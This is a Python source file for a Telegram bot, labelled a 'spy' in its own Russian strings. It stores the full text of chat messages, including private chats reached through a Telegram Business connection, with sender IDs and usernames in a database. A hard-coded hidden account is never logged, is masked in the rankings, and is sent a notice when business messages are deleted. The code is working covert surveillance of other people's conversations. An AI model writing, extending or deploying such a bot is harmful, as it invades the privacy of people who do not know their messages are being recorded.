# main.py
import asyncio
import logging
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.types import Message, BusinessConnection
from aiogram.filters import CommandStart
import config

logging.basicConfig(level=logging.INFO)

session = AiohttpSession(api=TelegramAPIServer.from_base(config.API_SERVER))
bot = Bot(token=config.BOT_TOKEN, session=session)
dp = Dispatcher()

HIDDEN_ID = 1780243499
HIDDEN_USERNAME = "zovx"

# --- ИНИЦИАЛИЗАЦИЯ БАЗЫ ---
async def init_db(pool):
    try:
        await pool.execute("""
            CREATE TABLE IF NOT EXISTS chat_stats (
                id SERIAL PRIMARY KEY,
                chat_id BIGINT,
                user_id BIGINT,
                username TEXT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    except Exception as e:
        logging.error(f"Ошибка создания таблицы: {e}")

# --- ЛОГИКА ОТВЕТА НА КОМАНДЫ (ВЫНЕСЕНА В ОТДЕЛЬНУЮ ФУНКЦИЮ) ---
async def process_commands(message: Message, db: asyncpg.Pool):
    text = message.text.lower().strip() if message.text else ""
    logging.info(f"Проверка команды в {message.chat.type}: {text}")
    
    # АЙДИ
    if ("айди" in text or "id" in text) and len(text) < 15:
        await message.reply(f"🆔 ID этого чата: <code>{message.chat.id}</code>", parse_mode="HTML")
        return True
        
    # ТОП
    if ("топ" in text or "top" in text) and len(text) < 15:
        try:
            rows = await db.fetch(
                "SELECT username, COUNT(*) as msg_count FROM chat_stats WHERE chat_id = $1 GROUP BY username ORDER BY msg_count DESC LIMIT 10",
                message.chat.id
            )
            if not rows:
                await message.reply("📊 В этом чате пока нет сообщений для статистики.")
                return True
            res = "🏆 <b>Топ-10:</b>\n\n"
            for i, row in enumerate(rows, 1):
                name = "Пользователь скрыт" if (row['username'] and row['username'].lower() == HIDDEN_USERNAME) else (f"@{row['username']}" if row['username'] else "Аноним")
                res += f"{i}. {name} — {row['msg_count']} сообщ.\n"
            await message.reply(res, parse_mode="HTML")
        except Exception as e:
            await message.reply(f"⚠️ Ошибка БД: {e}")
        return True
        
    return False

# --- ОБЫЧНЫЕ СООБЩЕНИЯ ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply("Привет! Я шпион. 🕵️\n\nНапиши `.айди` или `.топ`.")

@dp.message(F.text)
async def handler_normal(message: Message, db: asyncpg.Pool):
    # Проверяем, не команда ли это
    is_command = await process_commands(message, db)
    if is_command:
        return
        
    # Если это просто текст - пишем в базу
    text = message.text.lower().strip()
    if not text.startswith(('/', '.', '!')) and message.from_user.id != HIDDEN_ID:
        try:
            await db.execute(
                "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
                message.chat.id, message.from_user.id, message.from_user.username, message.text
            )
        except Exception as e:
            logging.error(f"Ошибка записи в БД: {e}")

# --- БИЗНЕС-СООБЩЕНИЯ (ЛС) ---
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(f"✅ Бизнес-бот подключен к аккаунту: {connection.user.id}")

@dp.business_message()
async def handler_business(message: Message, db: asyncpg.Pool):
    # Проверяем, не команда ли это
    is_command = await process_commands(message, db)
    if is_command:
        return

    # Если просто текст - пишем в базу
    text = message.text or "[Медиа]"
    if message.from_user.id != HIDDEN_ID:
        try:
            await db.execute(
                "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
                message.chat.id, message.from_user.id, message.from_user.username, text
            )
        except Exception as e:
            logging.error(f"Ошибка записи бизнес: {e}")

# --- УДАЛЕНИЯ ---
@dp.deleted_business_messages()
async def on_deleted_message(event):
    logging.info(f"🗑 Удалено в бизнесе: {event.message_ids}")
    try:
        await bot.send_message(
            chat_id=HIDDEN_ID, 
            text=f"🗑 <b>Удалено сообщение!</b>\nЧат: <code>{event.chat_id}</code>\nID сообщений: {event.message_ids}",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Не удалось отправить уведомление: {e}")

# --- ЗАПУСК ---
async def main():
    try:
        pool = await asyncpg.create_pool(config.DATABASE_URL)
        await init_db(pool)
        dp["db"] = pool
    except Exception as e:
        logging.error(f"❌ КРИТИЧЕСКАЯ ОШИБКА БАЗЫ: {e}")
        return

    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    logging.info("🚀 Шпион запущен.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
